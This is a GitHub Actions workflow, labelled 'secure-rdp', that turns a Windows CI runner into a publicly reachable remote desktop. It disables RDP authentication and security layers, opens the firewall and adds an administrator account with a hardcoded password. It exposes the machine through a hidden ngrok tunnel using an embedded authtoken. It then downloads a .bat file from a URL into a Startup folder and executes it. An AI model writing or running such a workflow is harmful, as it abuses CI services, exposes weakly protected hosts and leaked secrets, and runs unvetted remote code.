name: win 11

on:
  workflow_dispatch:

jobs:
  secure-rdp:
    runs-on: windows-2022
    timeout-minutes: 350

    steps:
      - name: Configure Core RDP Settings
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 0 -Force
          
          netsh advfirewall firewall delete rule name="RDP-Global"
          netsh advfirewall firewall add rule name="RDP-Global" dir=in action=allow protocol=TCP localport=3389
          Restart-Service -Name TermService -Force

      - name: Create RDP User with Fixed Password
        run: |
          $password = "TechZoner@001"
          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
          if (-not (Get-LocalUser -Name "RDP" -ErrorAction SilentlyContinue)) {
              New-LocalUser -Name "RDP" -Password $securePass -AccountNeverExpires
          }
          Add-LocalGroupMember -Group "Administrators" -Member "RDP"
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"

      - name: Install and Start ngrok Tunnel
        shell: powershell
        run: |
          Write-Host "Installing ngrok via Chocolatey..."
          choco install ngrok --no-progress -y
          
          $ngrokPath = "C:\ProgramData\chocolatey\bin\ngrok.exe"
          if (-not (Test-Path $ngrokPath)) {
              $ngrokPath = "ngrok"
          }

          Write-Host "Authenticating ngrok..."
          & $ngrokPath authtoken "3GAmkQyZ4aTDXmW8gL8bAYj5fD3_7U3pzSH4fnHg4ReB2pfiB"
          
          Write-Host "Starting TCP Tunnel with Logging..."
          # Ngrok'u log dosyası yazacak şekilde arka planda başlatıyoruz
          Start-Process $ngrokPath -ArgumentList "tcp 3389 --log=ngrok.log" -WindowStyle Hidden
          
          # Ngrok'un tüneli açması ve log yazması için 20 saniye bekliyoruz
          Start-Sleep -Seconds 20
          
          # Tünel adresini yerel API hatasına düşmemek için doğrudan log dosyasından çekiyoruz
          if (Test-Path "ngrok.log") {
              $logContent = Get-Content "ngrok.log" -Raw
              if ($logContent -match "url=(tcp://[^\s]+)") {
                  $publicUrl = $Matches[1]
                  $rdpAddress = $publicUrl -replace "tcp://", ""
                  
                  Write-Host "`n==============================================="
                  Write-Host "🚀 RDP BAĞLANTI BİLGİLERİ"
                  Write-Host "Adres (Computer): $rdpAddress"
                  Write-Host "Kullanıcı Adı: RDP"
                  Write-Host "Şifre: TechZoner@001"
                  Write-Host "===============================================\n"
              } else {
                  Write-Error "Ngrok baslatildi fakat log dosyasinda tünel adresi bulunamadi!"
                  Write-Host "--- NGROK LOGLARI ---"
                  Write-Host $logContent
                  exit 1
              }
          } else {
              Write-Error "ngrok.log dosyasi olusturulamadi! Ngrok arka planda calismiyor olabilir."
              exit 1
          }

      - name: Maintain Connection + Watch RDP User
        run: |
          $rdpProfile = "C:\Users\RDP"
          $startupPath = "$rdpProfile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
          $downloadUrl = "https://gitlab.com"
          $downloadPath = "$startupPath\Downloads.bat"

          while ($true) {
              if (Test-Path $rdpProfile) {
                  try {
                      if (-not (Test-Path $startupPath)) {
                          New-Item -ItemType Directory -Path $startupPath -Force | Out-Null
                      }
                      Invoke-WebRequest -Uri $downloadUrl -OutFile $downloadPath -UseBasicParsing
                      cmd /c $downloadPath
                      break
                  }
                  catch {
                      break
                  }
              }
              else {
                  Start-Sleep -Seconds 30
              }
          }

          while ($true) {
              Write-Host "[$(Get-Date)] RDP Active..."
              Start-Sleep -Seconds 300
          }
